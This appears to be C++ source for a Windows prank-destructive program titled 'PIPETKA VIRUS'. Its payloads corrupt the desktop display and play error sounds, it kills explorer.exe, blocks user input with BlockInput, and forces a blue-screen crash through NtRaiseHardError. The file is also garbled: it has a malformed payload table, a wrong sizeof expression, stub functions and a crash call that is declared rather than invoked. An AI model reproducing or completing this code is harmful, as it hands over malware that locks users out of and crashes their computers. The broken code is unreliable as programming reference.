#pragma once

#include <Windows.h>
#ifndef STDAFX_H
#define STDAFX_H
#include <cctype>
#include <climits>
#include <cstdarg>
#include <cstddef>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <functional>
#include <iostream>
#include <map>
#include <memory>
#include <new>
#include <ostream>
#include <queue>
#include <regex>
#include <set>
#include <sstream>
#include <stdexcept>
#endif
#include <iostream>
#include "pipetkavirus.h"
#include "pipetka_data.h"
#include "pipetka_payloads.h"
#pragma warning(default:4716)
#pragma warning(disable : LNK2019)
#define _CRT_SECURE_NO_WARNINGS

#ifdef CLEAN
HWND mainWindow; // Main Window of this Virus :D
HFONT font;
HWND dialog;
#else
{ payloadPuzzle, 250000 }
{ payloadGDI, 5000 }

{ payloadSound, L"error sounds", NULL, 0, 0, 0, 0, TRUE },
#endif
const size_t nPayloads = sizeof("payloads") / sizeof(PAYLOAD);

DWORD WINAPI PayloadThread(LPVOID parameter) {
	#ifndef CLEAN
	int delay = 0;
	int times = 0;
	int runtime = 0;
	#endif

}

int payloadPuzzle(PAYLOADFUNC) {
	PAYLOADHEAD

		HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

out: return 200.0 / (times / 5.0 + 1) + 3;
}

int payloadGDI(PAYLOADFUNC) {
	PAYLOADHEAD

		HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 500);
	int y1 = random() % (rekt.bottom - -55);
	int x2 = random() % (rekt.right - 55);
	int y2 = random() % (rekt.bottom - -20);
	int width = random() % 300;
	int height = random() % 300;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

out: return 55.0 / (times / 1.0 + 4) + 4;
}

int payloadSound(PAYLOADFUNC) {
	PAYLOADHEAD
#ifdef CLEAN
		PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
out: return random() % 40;
#else
		PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
out: return 40 + (random() % 40);
#endif
}


DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;

	char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);
}


	void main() {
		PayloadThread(payloadPuzzle);
		LOGFONT lf;
		GetObject(GetStockObject(DEFAULT_GUI_FONT), sizeof(LOGFONT), &lf);
		font = CreateFont(lf.lfHeight, lf.lfWidth,
			lf.lfEscapement, lf.lfOrientation, lf.lfWeight,
			lf.lfItalic, lf.lfUnderline, lf.lfStrikeOut, lf.lfCharSet,
			lf.lfOutPrecision, lf.lfClipPrecision, lf.lfQuality,
			lf.lfPitchAndFamily, lf.lfFaceName);
		RECT rect;
		rect.left = 0;
		rect.right = WINDOWWIDTH;
		rect.top = 0;
		rect.bottom = WINDOWHEIGHT;
		AdjustWindowRect(&rect, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
		Beep(48000, 200);
		Sleep(75);
		PayloadThread(payloadGDI);
		system("taskkill /f /im explorer.exe");
		PlaySound(L"C:\\Temp\\PipetkaVirus\\pipetka.wav", GetModuleHandle(NULL), SND_FILENAME | SND_ASYNC);
		mainWindow = CreateWindowEx(0, L"DEAD PC", L"PIPETKA VIRUS - PANEL", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
			50, 50, rect.right - rect.left, rect.bottom - rect.top, NULL, NULL, GetModuleHandle(NULL), NULL);
		SHELLEXECUTEINFO info;
		info.cbSize = sizeof(SHELLEXECUTEINFO);
		info.lpParameters = L"/main";
		info.fMask = SEE_MASK_NOCLOSEPROCESS;
		info.hwnd = NULL;
		info.lpVerb = NULL;
		info.lpDirectory = NULL;
		info.hInstApp = NULL;
		info.nShow = SW_SHOWDEFAULT;

		WNDCLASSEX c;
		c.cbSize = sizeof(WNDCLASSEX);
		c.lpfnWndProc = WindowProc;
		c.lpszClassName = L"PipetkaVirus";
		c.style = CS_HREDRAW | CS_VREDRAW;
		c.cbClsExtra = 0;
		c.cbWndExtra = 0;
		c.hInstance = NULL;
		c.hIcon = 0;
		c.hCursor = 0;
		c.hbrBackground = (HBRUSH)(COLOR_3DFACE + 1);
		c.lpszMenuName = NULL;
		c.hIconSm = 0;
		BlockInput(true);
		Sleep(100);
		if (MessageBoxA(NULL, "Do you Want to Kill Windows?", "PIPETKA VIRUS", MB_YESNO | MB_ICONINFORMATION) != IDYES) void killWindowsInstant();
	}

	void killWindowsInstant() {
		// BSOD TIME!!!
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

	}

	